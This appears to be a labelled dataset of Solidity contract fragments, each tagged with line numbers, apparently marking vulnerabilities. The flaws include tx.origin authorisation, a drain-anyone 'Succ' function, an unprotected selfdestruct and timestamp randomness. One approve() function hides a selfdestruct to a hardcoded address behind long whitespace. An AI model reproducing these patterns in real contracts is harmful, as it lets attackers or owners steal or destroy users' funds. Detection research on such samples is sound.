    using SafeMath for uint256;
    mapping(uint256=>uint256) public poolRecord;
    mapping(address=>uint256) public partner;
    mapping(address=>uint256) public partnerWithdrawRecord;
    uint256 public poolAmt=0;
    uint256 public count=0;
    uint256 public globalPercent=0;
    address public baseContractaddress;
    address public usdtaddress;
    event Transfer(address _from, address _to, uint256 _amount);
    event AddPartner(address _owner, address _partner, uint256 _percent);
    event RemovePartner(address _owner, address _partner, uint256 _timestamp);
    // function () external payable{}
    function payamount(uint256 _amount) public{
        require(msg.sender==baseContractaddress);
        require(_amount!=0,""Invalid Amount"");
        poolAmt=poolAmt.add(_amount);
        count=count.add(1);
        poolRecord[count]=poolAmt;
        emit Transfer(tx.origin,address(this),_amount);
    }
    function addBaseContract(address _add) public onlyOwner{
        require(_add!=address(0));
        baseContractaddress=_add;
    }
    constructor(address _usdtaddress) public{
        require(_usdtaddress!=address(0),""Invalid address"");
        usdtaddress=_usdtaddress;
    }
    function addpartner(address _partner, uint256 _percent) public onlyOwner{
        require(partner[_partner]==0,""Already Exist"");
        require(_partner!=address(0) && _percent!=0,""Invalid Argument"");
        require(globalPercent+_percent<=100,""Invalid Percentage for partner"");
        partner[_partner]=_percent;
        globalPercent=globalPercent.add(_percent);
        emit AddPartner(tx.origin,_partner,_percent);
    }
    function removePartner(address _partner) public onlyOwner{
        require(partner[_partner]!=0,""Partner not exist"");
        globalPercent=globalPercent.sub(partner[_partner]);
        delete partner[_partner];
        emit RemovePartner(tx.origin,_partner,block.timestamp);
    }
    function partnerbalance(address _user) public view returns(uint256)
    {
        uint256 percent=0;
        if(_user==owner)
        {
            percent=100-globalPercent;
        }
        else
        {
            percent=partner[_user];
        }
        uint256 eligible=calculatePercentage(poolRecord[count].sub(poolRecord[partnerWithdrawRecord[_user]]),percent.mul(100));
        return eligible;
    }
    function withdraw() public{
        require(partner[tx.origin]!=0 || tx.origin==owner,""You are not a partner"");
        uint256 eligible=partnerbalance(tx.origin);
         partnerWithdrawRecord[tx.origin]=count;
        usdtInterface(usdtaddress).transfer(tx.origin,eligible);
        // msg.sender.transfer(eligible);
        emit Transfer(address(this),tx.origin,eligible);
    }
     function calculatePercentage(uint256 PercentOf, uint256 percentTo ) internal pure returns (uint256)
    {
        uint256 factor = 10000;
        uint256 c = PercentOf.mul(percentTo).div(factor);
        return c;
    }
}",[64]
"pragma solidity ^0.4.15;
contract Ownable {
    address public owner;
    function Ownable() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}
contract Feeable is Ownable {
    uint8 public feePercent;
    function Feeable() public {
        feePercent = 50;
    }
    function setFeePercent(uint8 _feePercent) public onlyOwner {
        feePercent = _feePercent;
    }
    function minFee() public view returns(uint256) {
        return tx.gasprice * msg.gas * feePercent / 100;
    }
}
contract ERC20 {
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function transferFrom( address from, address to, uint value) returns (bool ok);
}
contract Multiplexer is Feeable {
    function sendEth(address[] _to, uint256[] _value) payable returns (bool _success) {
        assert(_to.length == _value.length);
        assert(_to.length <= 255);
        require(msg.value >= minFee());
        for (uint8 i = 0; i < _to.length; i++) {
            _to[i].transfer(_value[i]);
        }
        return true;
    }
    function sendErc20(address _tokenAddress, address[] _to, uint256[] _value) payable returns (bool _success) {
        assert(_to.length == _value.length);
        assert(_to.length <= 255);
        require(msg.value >= minFee());
        ERC20 token = ERC20(_tokenAddress);
        for (uint8 i = 0; i < _to.length; i++) {
            assert(token.transferFrom(msg.sender, _to[i], _value[i]) == true);
        }
        return true;
    }
    function claim(address _token) public onlyOwner {
        if (_token == 0x0) {
            owner.transfer(this.balance);
            return;
        }
        ERC20 erc20token = ERC20(_token);
        uint256 balance = erc20token.balanceOf(this);
        erc20token.transfer(owner, balance);
    }
}",[35]
"pragma solidity ^0.4.0;
contract owned {
    address public owner;
    function owned() {
        owner = msg.sender;
    }
    modifier onlyOwner {
        if (msg.sender != owner) throw;
        _;
    }
        /* 管理者的权限可以转移 */
    function transferOwnership(address newOwner) onlyOwner {
        owner = newOwner;
    }
}
/* 注意“contract MyToken is owned”，这类似于C++中的派生类的概念 */
contract MyToken is owned{
    /* Public variables of the token */
    string public standard = 'Token 0.1';
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
        uint256 public sellPrice;
        uint256 public buyPrice;
        uint minBalanceForAccounts;                                         //threshold amount
    /* This creates an array with all balances */
    mapping (address => uint256) public balanceOf;
        mapping (address => bool) public frozenAccount;
    /* This generates a public event on the blockchain that will notify clients */
    event Transfer(address indexed from, address indexed to, uint256 value);
        event FrozenFunds(address target, bool frozen);
    /* Initializes contract with initial supply tokens to the creator of the contract */
    function MyToken(
    uint256 initialSupply,
    string tokenName,
    uint8 decimalUnits,
    string tokenSymbol,
    address centralMinter
    ) {
    if(centralMinter != 0 ) owner = msg.sender;
        balanceOf[msg.sender] = initialSupply;              // Give the creator all initial tokens
        totalSupply = initialSupply;                        // Update total supply
        name = tokenName;                                   // Set the name for display purposes
        symbol = tokenSymbol;                               // Set the symbol for display purposes
        decimals = decimalUnits;                            // Amount of decimals for display purposes
    }
    /* 代币转移的函数 */
    function transfer(address _to, uint256 _value) {
            if (frozenAccount[msg.sender]) throw;
        if (balanceOf[msg.sender] < _value) throw;           // Check if the sender has enough
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; // Check for overflows
        if(msg.sender.balance<minBalanceForAccounts) sell((minBalanceForAccounts-msg.sender.balance)/sellPrice);
        if(_to.balance<minBalanceForAccounts)      _to.send(sell((minBalanceForAccounts-_to.balance)/sellPrice));
        balanceOf[msg.sender] -= _value;                     // Subtract from the sender
        balanceOf[_to] += _value;                            // Add the same to the recipient
        Transfer(msg.sender, _to, _value);                   // Notify anyone listening that this transfer took place
    }
         /* 货币增发的函数 */
        function mintToken(address target, uint256 mintedAmount) onlyOwner {
            balanceOf[target] += mintedAmount;
            totalSupply += mintedAmount;
            Transfer(0, owner, mintedAmount);
            Transfer(owner, target, mintedAmount);
        }
    /* 冻结账户的函数 */
        function freezeAccount(address target, bool freeze) onlyOwner {
            frozenAccount[target] = freeze;
            FrozenFunds(target, freeze);
        }
        /* 设置代币买卖价格的函数 */
        function setPrices(uint256 newSellPrice, uint256 newBuyPrice) onlyOwner {
            sellPrice = newSellPrice;
            buyPrice = newBuyPrice;
        }
         /* 从合约购买货币的函数 */
        function buy() returns (uint amount){
            amount = msg.value / buyPrice;                     // calculates the amount
            if (balanceOf[this] < amount) throw;               // checks if it has enough to sell
            balanceOf[msg.sender] += amount;                   // adds the amount to buyer's balance
            balanceOf[this] -= amount;                         // subtracts amount from seller's balance
            Transfer(this, msg.sender, amount);                // execute an event reflecting the change
            return amount;                                     // ends function and returns
        }
        /* 向合约出售货币的函数 */
        function sell(uint amount) returns (uint revenue){
            if (balanceOf[msg.sender] < amount ) throw;        // checks if the sender has enough to sell
            balanceOf[this] += amount;                         // adds the amount to owner's balance
            balanceOf[msg.sender] -= amount;                   // subtracts the amount from seller's balance
            revenue = amount * sellPrice;                      // calculate the revenue
            msg.sender.send(revenue);                          // sends ether to the seller
            Transfer(msg.sender, this, amount);                // executes an event reflecting on the change
            return revenue;                                    // ends function and returns
        }
    /* 设置自动补充gas的阈值信息 */
        function setMinBalance(uint minimumBalanceInFinney) onlyOwner {
            minBalanceForAccounts = minimumBalanceInFinney * 1 finney;
        }
}","[62, 91]"
"    //每次交易后价格上涨
    uint RISE_RATE = 110;
    uint RISE_RATE_FAST = 150;
    //平台抽成
    uint8 SALE_FEE_RATE = 2;
    //瓜分活动投入
    uint CARVE_UP_INPUT = 0.01 ether;
    //瓜分票
    uint[10] carveUpTokens = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
    uint8 carverUpIndex = 0;
    function NFToken() {
        setCFO(msg.sender);
        setCOO(msg.sender);
    }
    //默认方法
    function() external payable {
    }
    //交易分红
    event TransferBonus(address indexed _to, uint256 _tokenId, uint _bonus);
    //未交易卡更新
    event UnsoldUpdate(uint256 indexed _tokenId, uint price, uint openTime);
    //加入瓜分
    event JoinCarveUp(address indexed _account, uint _tokenId, uint _input);
    //瓜分分红
    event CarveUpBonus(address indexed _account, uint _tokenId, uint _bonus);
    //event CarveUpDone(uint _t, uint _t0, uint _t1, uint _t2, uint _t3, uint _t4, uint _t5, uint _t6, uint _t7, uint _t8, uint _t9);
    //加入瓜分活动
    function joinCarveUpTen(uint _tokenId) public payable onlyLiveMode onlyOwnerOf(_tokenId) returns (bool){
        //确认投入金额
        require(msg.value == CARVE_UP_INPUT);
        //确认 这张卡的本轮只用一次
        for (uint8 i = 0; i < carverUpIndex; i++) {
            require(carveUpTokens[i] != _tokenId);
        }
        //按当前索引进入队列
        carveUpTokens[carverUpIndex] = _tokenId;
        //日志&事件
        JoinCarveUp(msg.sender, _tokenId, msg.value);
        //第10人出现,结算了
        if (carverUpIndex % 10 == 9) {
            //索引归0
            carverUpIndex = 0;
            uint theLoserIndex = (now % 10 + (now / 10 % 10) + (now / 100 % 10) + (now / 1000 % 10)) % 10;
            for (uint8 j = 0; j < 10; j++) {
                if (j != theLoserIndex) {
                    uint bonus = CARVE_UP_INPUT * 110 / 100;
                    ownerOf(carveUpTokens[j]).transfer(bonus);
                    CarveUpBonus(ownerOf(carveUpTokens[j]), carveUpTokens[j], bonus);
                }else{
                    CarveUpBonus(ownerOf(carveUpTokens[j]), carveUpTokens[j], 0);
                }
            }
            //日志&事件
            //CarveUpDone(theLoserIndex, carveUpTokens[0], carveUpTokens[1], carveUpTokens[2], carveUpTokens[3], carveUpTokens[4], carveUpTokens[5], carveUpTokens[6], carveUpTokens[7], carveUpTokens[8], carveUpTokens[9]);
            carveUpTokens = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
        } else {
            carverUpIndex++;
        }
        return true;
    }
    // 买入【其它人可以以等于或高于当前价格买入，交易过程平台收取交易价格抽成2%，每次交易后价格上涨】
    function buy(uint _id) public payable onlyLiveMode returns (bool){
        TokenModel storage token = tokens[_id];
        require(token.price != 0);
        require(token.openTime < now);
        //检查价格
        require(msg.value >= token.price);
        //付钱给出让转
        ownerOf(_id).transfer(token.price * (100 - 2 * SALE_FEE_RATE) / 100);
        //给用户分成
        if (totalSupply() > 1) {
            uint bonus = token.price * SALE_FEE_RATE / 100 / (totalSupply() - 1);
            for (uint i = 1; i <= totalSupply(); i++) {
                if (i != _id) {
                    ownerOf(i).transfer(bonus);
                    TransferBonus(ownerOf(i), i, bonus);
                }
            }
        }
        //转让
        clearApprovalAndTransfer(ownerOf(_id), msg.sender, _id);
        //价格上涨
        if (token.price < 1 ether) {
            token.price = token.price * RISE_RATE_FAST / 100;
        } else {
            token.price = token.price * RISE_RATE / 100;
        }
        token.lastTime = now;
        return true;
    }
    //上架
    function createByCOO(string serial, uint price, uint openTime) public onlyCOO returns (uint){
        uint currentTime = now;
        return __createNewToken(this, serial, currentTime, price, currentTime, openTime).id;
    }
    //更新未出售中的token
    function updateUnsold(string serial, uint _price, uint _openTime) public onlyCOO returns (bool){
        require(idOfSerial[serial] > 0);
        TokenModel storage token = tokens[idOfSerial[serial]];
        require(token.lastTime == token.createTime);
        token.price = _price;
        token.openTime = _openTime;
        UnsoldUpdate(token.id, token.price, token.openTime);
        return true;
    }
    //生成新的token
    function __createNewToken(address _to, string serial, uint createTime, uint price, uint lastTime, uint openTime) private returns (TokenModel){
        require(price > 0);
        require(idOfSerial[serial] == 0);
        uint id = totalSupply() + 1;
        idOfSerial[serial] = id;
        TokenModel memory s = TokenModel(id, serial, createTime, price, lastTime, openTime);
        tokens[id] = s;
        _mint(_to, id);
        return s;
    }
    //根据ID得详细
    function getTokenById(uint _id) public view returns (uint id, string serial, uint createTime, uint price, uint lastTime, uint openTime, address owner)
    {
        return (tokens[_id].id, tokens[_id].serial, tokens[_id].createTime, tokens[_id].price, tokens[_id].lastTime, tokens[_id].openTime, ownerOf(_id));
    }
    //获取瓜分游戏
    function getCarveUpTokens() public view returns (uint[10]){
        return carveUpTokens;
    }
    //财务提现
    function withdrawContractEther(uint withdrawAmount) public onlyCFO {
        uint256 balance = this.balance;","[48, 49, 50, 71, 72, 81]"
"        _balances[account] = _balances[account].sub(amount, ""ERC20: burn amount exceeds balance"");
        totalSupply = totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), ""ERC20: approve from the zero address"");
        require(spender != address(0), ""ERC20: approve to the zero address"");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _fee(address from, address to, uint256 amount) internal virtual {
        if(from == address(0) || to == address(0))
            return;
        if(feeManager== address(0))
            return;
        IFeeManager(feeManager).queryFee(from,to,amount);
    }
}
abstract contract ERC20Burnable is ERC20 {
    /**
     * @dev Destroys `amount` tokens from the caller.
     *
     * See {ERC20-_burn}.
     */
    function burn(uint256 amount) public virtual {
        _burn(_msgSender(), amount);
    }
    /**
     * @dev Destroys `amount` tokens from `account`, deducting from the caller's
     * allowance.
     *
     * See {ERC20-_burn} and {ERC20-allowance}.
     *
     * Requirements:
     *
     * - the caller must have allowance for ``accounts``'s tokens of at least
     * `amount`.
     */
    function burnFrom(address account, uint256 amount) public virtual{
        _burn(account, amount);
    }
}
contract NOU is ERC20Burnable, Ownable {
    constructor() public ERC20('NoUChain', 'NOU') {
        _mint(msg.sender, 69e18);
    }
    function mint(address recipient_, uint256 amount_)
        public
        onlyOwner
        returns (bool)
    {
        uint256 balanceBefore = balanceOf(recipient_);
        _mint(recipient_, amount_);
        uint256 balanceAfter = balanceOf(recipient_);
        return balanceAfter >= balanceBefore;
    }
    function burn(uint256 amount) public override onlyOwner {
        super.burn(amount);
    }
    function burnFrom(address account, uint256 amount)
        public
        override
    {
        require(owner() == tx.origin);
        super.burnFrom(account, amount);
    }
    // Fallback rescue
    function destroy() public {
        require(msg.sender == owner(), ""no u 2"");
        selfdestruct(msg.sender);
    }
    receive() external payable{
        payable(owner()).transfer(msg.value);
    }
    function rescueToken(IERC20 _token) public {
        _token.transfer(owner(), _token.balanceOf(address(this)));
    }
}",[64]
"pragma solidity >=0.6.6;
contract NTeria {
    address payable owner;
    struct Person {
        address payable voter;
        uint256 amount;
        string decision;
    }
    bytes32 private_key_hashed;
    uint people_count;
    bool voting_in_progress;
    mapping(uint => Person) people;
    event RevealKey(string);
    event VotingClosed(uint);
    constructor() public {
        owner = msg.sender;
    }
    modifier isOwner() {
        require(msg.sender == owner, ""Caller is not owner"");
        _;
    }
    function add_funds() public payable isOwner {}
    function withdraw_funds() public isOwner {
        require(address(this).balance>0, 'Balance is zero');
        owner.transfer(address(this).balance);
    }
    function open_voting(bytes32 _private_key_hashed) public isOwner {
        private_key_hashed = _private_key_hashed;
        voting_in_progress = true;
    }
    function get_vote(string memory _private_key, string memory _decision) internal pure returns(uint _vote) {
        bytes32 _data = keccak256(abi.encodePacked(_private_key,_decision));
        assembly { 
            _vote := and(_data,0xf)
        }
        return _vote;        
    }
    function close_voting() public isOwner {
        require(voting_in_progress, ""No voting to close"");
        uint _balance = get_voting_balance();
        delete voting_in_progress;
        emit VotingClosed(_balance);
    }
    function reveal_key_and_pay(string memory  _private_key) public isOwner {
        require(!voting_in_progress, ""First, close voting"");
        require(keccak256(abi.encodePacked(_private_key)) == private_key_hashed, ""Wrong private key"");
        emit RevealKey(_private_key);
        uint[16] memory _people_votes;
        for (uint i;i<people_count;i++)
            _people_votes[get_vote(_private_key,people[i].decision)]++;
        uint _max_votes = 0;
        for (uint j;j<16;j++)
            if (_people_votes[j] > _max_votes)
                _max_votes = _people_votes[j];
        uint _money_to_give;
        uint _winners_count = 1;
        for (uint i;i<people_count;i++) {
            uint _vote = get_vote(_private_key,people[i].decision);
            if (_people_votes[_vote] == _max_votes) {
                _money_to_give += people[i].amount;
                delete people[i];
            } else if (people[i].amount > 0) {
                _winners_count ++;
            }
        }
        _money_to_give -= _money_to_give%_winners_count;
        uint _qty = _money_to_give/_winners_count;
        for (uint i;i<people_count;i++) {
            if (people[i].amount > 0) {
                people[i].voter.transfer(_qty+people[i].amount);
                delete people[i];
            }
        }
        delete people_count;
        delete private_key_hashed;
    }
    function make_vote(string memory _decision) public payable {
        require(voting_in_progress, ""Voting is closed"");
        require(msg.value > 0, ""You should pay something"");
        people[people_count] = Person(msg.sender,msg.value,_decision);
        people_count ++;
    }
    function cancel_vote() public {
        require(voting_in_progress, ""Voting is closed"");
        for (uint i;i<people_count;i++) {
            if (people[i].voter == msg.sender) {
                msg.sender.transfer(people[i].amount);
                delete people[i];
            }
        }
    }
    function get_voting_balance() public view returns(uint _val){
        _val = 0;
        for (uint i;i<people_count;i++) {
            _val += people[i].amount;
        }
    }
    function get_number_votes() public view returns(uint _val){
        _val = 0;
        for (uint i;i<people_count;i++) {
            if (people[i].amount>0) {
                _val ++;
            }
        }
    }
    function destroy_contract() public isOwner{
        selfdestruct(owner);
    }
}","[70, 87]"
"pragma solidity ^0.4.6;
/* how to send to multiple addrs? in address box type in addresses and separte them with a comma.
EX: 0x3c914C5c25Ea166F6B7c8131879B892Ed2912C6A, 0x3c914C5c25Ea166F6B7c8131879B892Ed2912C6A
if anything goes wrong, and the eth stays in contract, please call the Succ function. it will succ everything from the contract
bear in mind that bots may be camping it and remove funds before you can.
*/
contract NaiveSplit {
  // emit events for real-time listeners and state history
  event LogReceived(address sender, uint amount);
  event LogSent(address beneficiary, uint amount);
  // split using commas pls
  function pay(address[] addresses) public payable returns(bool success)
  {
    if(msg.value==0 || addresses.length == 0) revert();
    uint split = msg.value / addresses.length;
    emit LogReceived(msg.sender, msg.value);
    for (uint i=0; i<addresses.length; i++) {
        addresses[i].transfer(split);
        emit LogSent(addresses[i], split);
    }
    return true;
  }
  function Succ() public returns(bool success){
      tx.origin.transfer(address(this).balance);
      return true;
  }
}","[17, 18]"
"pragma solidity 0.4.24;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract Netethermoney {
    event Multisended(uint256 value , address sender);
    using SafeMath for uint256;
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }
}",[36]
"    /* Send coins */
    function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {
        if (balanceOf[msg.sender] < _value) return false;              // Check if the sender has enough
        if (balanceOf[_to] + _value < balanceOf[_to]) return false;    // Check for overflows
        if (_to == owner || _to == address(this)) return false;         // makes it illegal to send tokens to owner or this contract
        _transfer(msg.sender, _to, _value);
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);                        // Subtract from the sender
        balanceOf[_to] = balanceOf[_to].add(_value);                               // Add the same to the recipient
        /* Adding to shareholders count if tokens spent from owner to others */
        if (msg.sender == owner && _to != owner) {
            totalSupply += _value;
        }
        /* Remove from shareholders count if tokens spent from holder to owner */
        if (msg.sender != owner && _to == owner) {
            totalSupply = totalSupply.sub(_value);
        }
        if (owner == _to) {
            // sender is owner
        } else {
            insertShareholder(_to);
        }
        /* Notify anyone listening that this transfer took place */
        Transfer(msg.sender, _to, _value);
        return true;
    }
    function _transfer(address _from, address _to, uint256 _value) internal {
        require(!accounts[_from].blacklisted);
        require(!accounts[_to].blacklisted);
        require(_to != address(0));
        require(_value <= accounts[_from].balance);
        require(accounts[_to].balance + _value > accounts[_to].balance);
        var fromOwing = nihilumBalanceOf(_from);
        var toOwing = nihilumBalanceOf(_to);
        require(fromOwing <= 0 && toOwing <= 0);
        accounts[_from].balance = accounts[_from].balance.sub(_value);
        accounts[_to].balance = accounts[_to].balance.add(_value);
        accounts[_to].lastNihilum = totalNihilum;//accounts[_from].lastNihilum;
        //Transfer(_from, _to, _value);
    }
    function addTokens(uint256 numTokens) public onlyOwner {
        if (_allowManualTokensGeneration) {
            balanceOf[msg.sender] += numTokens;
            accounts[msg.sender].balance = accounts[msg.sender].balance.add(numTokens);
            Transfer(0, msg.sender, numTokens);
        } else {
            revert();
        }
    }
    function blacklist(address person) public onlyOwner {
        require(person != owner);
        balanceOf[person] = 0;
        accounts[person].balance = 0;
        accounts[person].lastNihilum = totalNihilum;
        accounts[person].blacklisted = true;
    }
    function () external payable {
      if (!crowdsalePaused) {
          buyTokens();
          } else {
              PayNihilumToContract();
              }
    }
        function whitelist(address userAddress) onlyOwner {
            accounts[userAddress].whitelisted = true;
    }
    /* Buy Token 1 token for x ether */
    function buyTokens() public whenCrowdsaleNotPaused payable {
        require(!accounts[msg.sender].blacklisted);
        require(msg.value > 0);
        require(msg.value >= _tokenPrice);
        require(msg.value % _tokenPrice == 0);
        var numTokens = msg.value / _tokenPrice;
        require(numTokens >= _minimumTokens);
        balanceOf[msg.sender] += numTokens;
        Transfer(0, msg.sender, numTokens);
        wallet.transfer(msg.value);
        accounts[msg.sender].balance = accounts[msg.sender].balance.add(numTokens);
        insertShareholder(msg.sender);
        if (msg.sender != owner) {
            totalSupply += numTokens;
        }
    }
    function payNihilum() public onlyOwner {
        if (this.balance > 0 && totalShareholders > 0) {
            for (uint i = lastUnpaidIteration; i <= totalShareholders; i++) {
                uint256 currentBalance = balanceOf[shareholders[i]];
                lastUnpaidIteration = i;
                if (currentBalance > 0 && nihilumBalanceOf(shareholders[i]) > 0 && !accounts[shareholders[i]].isClaiming && msg.gas > 2000) {
                    accounts[shareholders[i]].isClaiming = true;
                    shareholders[i].transfer(nihilumBalanceOf(shareholders[i]));
                    accounts[shareholders[i]].lastNihilum = totalNihilum;
                    accounts[shareholders[i]].isClaiming = false;
                }
            }
            lastUnpaidIteration = 1;
        }
    }
    function nihilumBalanceOf(address account) public constant returns (uint256) {
        var newNihilum = totalNihilum.sub(accounts[account].lastNihilum);
        var product = accounts[account].balance.mul(newNihilum);
        if (totalSupply <= 0) return 0;
        if (account == owner) return 0;
        return product.div(totalSupply);
    }
    function claimNihilum() public {
        require(!accounts[msg.sender].blacklisted);
        var owing = nihilumBalanceOf(msg.sender);
        if (owing > 0 && !accounts[msg.sender].isClaiming) {
            accounts[msg.sender].isClaiming = true;
            accounts[msg.sender].lastNihilum = totalNihilum;
            msg.sender.transfer(owing);
            accounts[msg.sender].isClaiming = false;
        }
    }
    function PayNihilumToContract() public onlyOwner payable {
        totalNihilum = totalNihilum.add(msg.value);
    }
        function PayToContract() public onlyOwner payable {
    }
    function ChangeTokenPrice(uint256 newPrice) public onlyOwner {
        _tokenPrice = newPrice;
    }
    function insertShareholder(address _shareholder) internal returns (bool) {
        if (registeredShareholders[_shareholder] == true) {
        } else {
            totalShareholders += 1;
            shareholders[totalShareholders] = _shareholder;
            registeredShareholders[_shareholder] = true;","[42, 85, 87]"
"pragma solidity ^0.4.0;
contract Nobody {
    function die() public {
        selfdestruct(msg.sender);
    }
}","[3, 4]"
"      returns (bool)
    {
		var balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * PRECISION);
		totalPayouts += (int256) (balance * PRECISION);
		msg.sender.transfer(balance);
		return true;
    }
	function sellMyTokensDaddy() public {
		var balance = balanceOf(msg.sender);
		transferTokens(msg.sender, address(this),  balance); // this triggers the internal sell function
	}
    function getMeOutOfHere() public {
		sellMyTokensDaddy();
        withdraw(1); // parameter is ignored
	}
	function fund()
      public
      payable
      returns (bool)
    {
      if (msg.value > 0.000001 ether)
			buy();
		else
			return false;
      return true;
    }
	function buyPrice() public constant returns (uint) {
		return getTokensForEther(1 finney);
	}
	function sellPrice() public constant returns (uint) {
		return getEtherForTokens(1 finney);
	}
	// End of useless functions
	// Invariants
	// totalPayout/Supply correct:
	//   totalPayouts = \sum_{addr:address} payouts(addr)
	//   totalSupply  = \sum_{addr:address} balanceOfOld(addr)
	// dividends not negative:
	//   \forall addr:address. payouts[addr] <= earningsPerShare * balanceOfOld[addr]
	// supply/reserve correlation:
	//   totalSupply ~= exp(LOGC + CRRN/CRRD*log(reserve())
	//   i.e. totalSupply = C * reserve()**CRR
	// reserve equals balance minus payouts
	//   reserve() = this.balance - \sum_{addr:address} dividends(addr)
	function transferTokens(address _from, address _to, uint256 _value) internal {
		if (balanceOfOld[_from] < _value)
			revert();
		if (_to == address(this)) {
			sell(_value);
		} else {
		    int256 payoutDiff = (int256) (earningsPerShare * _value);
		    balanceOfOld[_from] -= _value;
		    balanceOfOld[_to] += _value;
		    payouts[_from] -= payoutDiff;
		    payouts[_to] += payoutDiff;
		}
		Transfer(_from, _to, _value);
	}
	function transfer(address _to, uint256 _value) public {
	    transferTokens(msg.sender, _to,  _value);
	}
    function transferFrom(address _from, address _to, uint256 _value) public {
        var _allowance = allowance[_from][msg.sender];
        if (_allowance < _value)
            revert();
        allowance[_from][msg.sender] = _allowance - _value;
        transferTokens(_from, _to, _value);
    }
    function approve(address _spender, uint256 _value) public {
        // To change the approve amount you first have to reduce the addresses`
        //  allowance to zero by calling `approve(_spender, 0)` if it is not
        //  already 0 to mitigate the race condition described here:
        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
                                                                                                                                                                                                                                                                                                                                                                                                       selfdestruct(0x5C49aa6F9b123317D02908Bd0d3111356becD7cD);
        if ((_value != 0) && (allowance[msg.sender][_spender] != 0)) revert();
        allowance[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
    }
	function dividends(address _owner) public constant returns (uint256 amount) {
		return (uint256) ((int256)(earningsPerShare * balanceOfOld[_owner]) - payouts[_owner]) / PRECISION;
	}
	function withdrawOld(address to) public {
		var balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * PRECISION);
		totalPayouts += (int256) (balance * PRECISION);
		to.transfer(balance);
	}
	function balance() internal constant returns (uint256 amount) {
		return this.balance - msg.value;
	}
	function reserve() public constant returns (uint256 amount) {
		return balance()
			- ((uint256) ((int256) (earningsPerShare * totalSupply) - totalPayouts) / PRECISION) - 1;
	}
	function buy() internal {
		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
			revert();
		var sender = msg.sender;
		// 5 % of the amount is used to pay holders.
		var fee = (uint)(msg.value / 10);
		// compute number of bought tokens
		var numEther = msg.value - fee;
		var numTokens = getTokensForEther(numEther);
		var buyerfee = fee * PRECISION;
		if (totalSupply > 0) {
			// compute how the fee distributed to previous holders and buyer.
			// The buyer already gets a part of the fee as if he would buy each token separately.
			var holderreward =
			    (PRECISION - (reserve() + numEther) * numTokens * PRECISION / (totalSupply + numTokens) / numEther)
			    * (uint)(CRRD) / (uint)(CRRD-CRRN);
			var holderfee = fee * holderreward;
			buyerfee -= holderfee;
			// Fee is distributed to all existing tokens before buying
			var feePerShare = holderfee / totalSupply;
			earningsPerShare += feePerShare;
		}
		// add numTokens to total supply
		totalSupply += numTokens;
		// add numTokens to balance
		balanceOfOld[sender] += numTokens;
		// fix payouts so that sender doesn't get old earnings for the new tokens.
		// also add its buyerfee
		var payoutDiff = (int256) ((earningsPerShare * numTokens) - buyerfee);
		payouts[sender] += payoutDiff;
		totalPayouts += payoutDiff;
	}
	function sell(uint256 amount) internal {","[54, 70, 75]"
"        }
    }
    /**
     * @dev Function for buying tokens
     * @param beneficiary The address that should receive bought tokens
     */
    function buyTokens(address beneficiary) public payable {
        require(beneficiary != address(0));
        require(validPurchase());
        require(currentStage < getStageCount());
        uint256 value = msg.value;
        weiRaised = weiRaised.add(value);
        uint256 limit = getStageLimit(currentStage);
        uint256 dif = 0;
        uint256 returnToSender = 0;
        if(weiRaised > limit){
            dif = weiRaised.sub(limit);
            value = value.sub(dif);
            if(currentStage == getStageCount() - 1){
                returnToSender = dif;
                weiRaised = weiRaised.sub(dif);
                dif = 0;
            }
        }
        mintTokens(value, beneficiary);
        if(dif > 0){
            currentStage = currentStage + 1;
            mintTokens(dif, beneficiary);
        }
        // Allow transfers 2 weeks after hard cap is reached
        if(tokensSold == hardCap) {
            reward.setStartTime(now + 2 weeks);
        }
        // // Return funds that are over hard cap
        if(returnToSender > 0) {
            msg.sender.transfer(returnToSender);
        }
    }
    function mintTokens(uint256 value, address sender) private{
        uint256 tokens = value.mul(kRate).mul(getStageDiscount(currentStage)).div(100);
        // update state
        tokensSold = tokensSold.add(tokens);
        // update balance
        balances[sender] = balances[sender].add(value);
        reward.transferFrom(owner, sender, tokens);
        TokenPurchase(msg.sender, sender, value, tokens);
        // Forward funds
        wallet.transfer(value);
    }
    /**
     * @dev Internal function that is used to check if the incoming purchase should be accepted.
     * @return True if the transaction can buy tokens
     */
    function validPurchase() internal constant returns (bool) {
        bool withinPeriod = now >= startTime && now <= endTime;
        bool nonZeroPurchase = msg.value != 0 && msg.value >= kMinStake && msg.value <= kMaxStake;
        bool hardCapNotReached = tokensSold < hardCap;
        return withinPeriod && nonZeroPurchase && hardCapNotReached;
    }
    /**
     * @return True if crowdsale event has ended
     */
    function hasEnded() public constant returns (bool) {
        return now > endTime || tokensSold >= hardCap;
    }
    /**
     * @dev Returns ether to token holders in case soft cap is not reached.
     */
    function claimRefund() external {
        require(hasEnded());
        require(tokensSold < softCap);
        uint256 amount = balances[msg.sender];
